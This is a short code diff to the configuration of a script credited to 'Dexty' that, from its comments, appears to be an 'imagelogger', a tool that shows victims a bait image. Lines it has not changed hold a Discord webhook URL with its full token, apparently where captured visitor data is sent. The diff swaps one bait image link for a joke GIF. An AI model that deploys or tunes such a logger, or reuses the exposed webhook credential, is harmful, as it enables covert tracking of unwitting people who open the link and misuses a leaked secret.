@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1409072472539529308/33ydouwoEoH6AxaR6HtOeyexJXiO78cixRsYGw_LkqDIptsLKyNLMS5e73-CKoQBWG8w",
-    "image": "https://www.rmany.com/media/pages/lgbtqia/gay-men/ivf/3d210a4b4c-1729794597/ivf_gay_hero.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/AvRRyOmCycoAAAAM/joke.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
